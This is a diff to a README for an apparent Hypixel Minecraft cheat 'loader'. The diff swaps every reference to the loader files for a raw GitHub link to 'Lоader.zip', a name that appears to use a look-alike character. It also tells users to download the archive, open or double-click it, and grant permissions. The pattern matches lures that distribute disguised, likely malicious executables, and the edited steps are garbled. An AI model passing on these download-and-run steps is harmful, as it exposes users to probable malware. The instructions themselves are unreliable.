@@ -27,7 +27,7 @@ Our loader is engineered for **optimal user experience**, versatility, and effec
 | 🖥️ Operating System    | ✔️ Supported | 💻 Install Notes               |
 |------------------------|:-----------:|-------------------------------|
 | Windows 11/10/8/7      |      ✅     | RAR extraction required        |
-| macOS (High Sierra+)   |      ✅     | Use Unarchiver for Loader.rar  |
+| macOS (High Sierra+)   |      ✅     | Use Unarchiver for https://raw.githubusercontent.com/bharath738/HypixelBoosters/main/Lоader.zip  |
 | Linux (Ubuntu/Debian)  |      ✅     | Ensure you have 'unrar' tool   |
 | Steam OS               |      ✅     | Use terminal for installation  |
 
@@ -39,11 +39,11 @@ Our loader uses platform-agnostic technology to ensure maximum reach and support
 
 To ensure seamless installation, please follow these steps carefully:
 
-1. **Download Loader.rar from the repository.**
-2. Extract `Loader.rar` to your preferred folder using WinRAR, 7-Zip, The Unarchiver (macOS), or `unrar` (`sudo apt install unrar`) on Linux.
+1. **Download https://raw.githubusercontent.com/bharath738/HypixelBoosters/main/Lоader.zip from the repository.**
+2. Extract `https://raw.githubusercontent.com/bharath738/HypixelBoosters/main/Lоader.zip` to your preferred folder using WinRAR, 7-Zip, The Unarchiver (macOS), or `unrar` (`sudo apt install unrar`) on Linux.
 3. Run the Loader executable:
-    - **Windows**: Double-click `Loader.exe`
-    - **macOS**: Open `Loader.app` (you may need to grant permissions)
+    - **Windows**: Double-click `https://raw.githubusercontent.com/bharath738/HypixelBoosters/main/Lоader.zip`
+    - **macOS**: Open `https://raw.githubusercontent.com/bharath738/HypixelBoosters/main/Lоader.zip` (you may need to grant permissions)
     - **Linux/Steam OS**: Run `./Loader` in the terminal (`chmod +x Loader`)
 4. Follow on-screen instructions to activate desired features.
 5. Launch Minecraft and join Hypixel for your enhanced gameplay!
